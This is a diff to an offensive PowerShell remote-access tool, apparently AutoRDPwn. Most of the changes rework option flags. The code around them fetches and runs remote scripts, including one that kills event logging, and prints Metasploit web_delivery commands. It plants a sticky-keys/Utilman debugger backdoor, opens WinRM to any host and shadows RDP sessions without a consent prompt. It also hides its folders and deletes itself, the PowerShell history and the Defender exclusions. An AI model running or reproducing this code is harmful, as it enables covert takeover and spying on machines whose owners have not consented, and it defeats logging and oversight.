@@ -289,7 +289,7 @@ function Remove-Exclusions {
         Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $shell = $Host.UI.ReadLine() ; Write-Host
 
-        if($shell -like '1'){ $console = $true ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
+        if($shell -like '1'){ $console = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
         
         if($shell -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host
         Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
@@ -374,7 +374,7 @@ function Remove-Exclusions {
         if($forwarding -like '2') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
         $rlport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $rlhost = $Host.UI.ReadLine() ; Write-Host
         Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rrport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rrhost = $Host.UI.ReadLine()
-        $remoteforward = $true ; Write-Host ; Write-Host "$txt46" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
+        $remoteforward = "true" ; Write-Host ; Write-Host "$txt46" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
 
         if($forwarding -like '3') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; $proxy = netsh interface portproxy show all
         if(!$proxy){ Write-Host ; Write-Host "$txt47" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 } else { $Host.UI.RawUI.ForegroundColor = 'Gray' ; netsh interface portproxy show all ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }}
@@ -385,7 +385,7 @@ function Remove-Exclusions {
         if($forwarding -like 'X'){ $input = 'x' ; continue }
         if($forwarding -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
 
-        if($networking -like '3') { $webserver = $true ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
+        if($networking -like '3') { $webserver = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
 
         if($networking -like 'X'){ $input = 'x' ; continue }
         if($networking -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
@@ -423,9 +423,9 @@ function Remove-Exclusions {
         Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $backdoor = $Host.UI.ReadLine() ; Write-Host
         
-        if($backdoor -like '1') { $stickykeys = $true ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
+        if($backdoor -like '1') { $sticky = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
 
-        if($backdoor -like '2') { $metasploit = $true ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 
+        if($backdoor -like '2') { $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 
         $metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
         Write-host "$txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
@@ -435,7 +435,7 @@ function Remove-Exclusions {
         Write-host "set LPORT 4444" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit"
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }
 
-        if($backdoor -like '3') { $getkeys = $true ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
+        if($backdoor -like '3') { $getkeys = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
 
         if($backdoor -like 'X'){ $input = 'x' ; continue }
         if($backdoor -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
@@ -477,7 +477,7 @@ function Remove-Exclusions {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Phant0m.ps1')
         Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }
         
-        if($othermodule -like '2'){ $vncserver = $true ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
+        if($othermodule -like '2'){ $vncserver = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
         
         if($othermodule -like '3') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host
         do { Write-Host "$txt73" -NoNewLine -ForegroundColor Gray ; $externalscript = $Host.UI.ReadLine() ; Write-Host
@@ -501,9 +501,9 @@ function Remove-Exclusions {
    $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
    Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
    if(!$user) { $RDP = New-PSSession -Computer $computer -Authentication Negotiate } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) 
-   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; if ($session){ $attack = $true
+   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; if ($session){ $attack = "true"
 
-        do { $Host.UI.RawUI.ForegroundColor = 'Green' ; if($stickykeys){ $input = "control" ; $sticky = $true } elseif($shadowoption -like '-shadow') { $input=$args[7] } else {
+        do { $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $input = "sticky" } elseif($shadowoption -like '-shadow') { $input=$args[7] } else {
         Write-Host ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $input = $Host.UI.ReadLine()}
         switch -wildcard ($input) {
 
@@ -515,11 +515,14 @@ function Remove-Exclusions {
         invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
         Write-Host "$using:txt30" -ForegroundColor Blue }}
 
-        'control*' { $control = $true ; Write-Host
+        'control*' { $control = "true" ; Write-Host
         invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
-        if ($sticky = $true){ Write-Host "$using:txt34" -ForegroundColor Blue } else { Write-Host "$using:txt31" -ForegroundColor Blue }}}
+        Write-Host "$using:txt31" -ForegroundColor Blue }}
 
-        default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}} until ($input -in 'ver','see','controlar','control')
+        'sticky' { $control = "true" ; Write-Host
+        Write-Host "$txt34" -ForegroundColor Blue }
+
+        default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}} until ($input -in 'ver','see','controlar','control','sticky')
 
     invoke-command -session $RDP[0] -scriptblock {
     $AllowAnonymousCallback = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM").AllowAnonymousCallback
@@ -556,12 +559,12 @@ function Remove-Exclusions {
     $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"))
     Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn }}
         
-    if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock {
+    if ($sticky){ invoke-command -session $RDP[0] -scriptblock {
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
     powercfg /setacvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null ; powercfg /setdcvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null }}
 
-        if($version -Like '*Server*') { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$stickykeys) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
+        if($version -Like '*Server*') { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$sticky) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
         Write-Host ; Write-Host "$using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } ; $Host.UI.RawUI.ForegroundColor = 'Green'
         do { Write-Host ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
@@ -571,7 +574,7 @@ function Remove-Exclusions {
         if($OSVersion -like 'Unix'){ if(!$user){ xfreerdp /v:$computer /restricted-admin /u:$user } else { xfreerdp /v:$computer /admin /u:$user /p:$password }}
         if(!$nogui){ if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
         if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
-        if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
+        if($control -eq 'true') { if($sticky){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
 
         else { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$vncserver){ 
@@ -582,16 +585,16 @@ function Remove-Exclusions {
         netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
         attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; Start-Sleep -milliseconds 7500 ; rm .\Setup.msi 2>&1> $null }}
 
-        if(!$stickykeys) { $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId | Select-Object -first 1 } ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; Write-Host ; Write-Host "$txt35" ; Start-Sleep -milliseconds 2500 }
+        if(!$sticky) { $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId | Select-Object -first 1 } ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; Write-Host ; Write-Host "$txt35" ; Start-Sleep -milliseconds 2500 }
         if($OSVersion -like 'Unix'){ if(!$user){ xfreerdp /v:$computer /restricted-admin /u:$user } else { xfreerdp /v:$computer /admin /u:$user /p:$password }}
         if(!$nogui){ if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
         if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
-        if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
+        if($control -eq 'true') { if($sticky){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
 
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host $txt66 ; Write-Host ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /prompt /f" ; Write-Host
-if ($createuser -like '-createuser') { $hash = $true ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
+if ($createuser -like '-createuser') { $hash = "true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
 else { Write-Host $txt38 -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock {
@@ -643,7 +646,7 @@ if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-
 else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 } if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
 
 if ($noclean -like '-noclean') { $null } else { Write-Host ; Write-Host $txt75 -ForegroundColor Red ; Start-Sleep -milliseconds 2500
-if ($stickykeys) { $sid = (gwmi win32_process | select handle, commandline | findstr "mstsc" | findstr "admin").split("").trim()[0] ; Wait-Process -Id $sid } 
+if ($sticky) { $sid = (gwmi win32_process | select handle, commandline | findstr "mstsc" | findstr "admin").split("").trim()[0] ; Wait-Process -Id $sid } 
 else { $sid = (gwmi win32_process | select handle, commandline | findstr "mstsc" | findstr "shadow").split("").trim()[0] ; Wait-Process -Id $sid }
 if ($attack) { Start-Sleep -milliseconds 2500 ; Write-Host ; Write-Host $txt77 -ForegroundColor Blue ; Start-Sleep -milliseconds 4500 }
 $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null
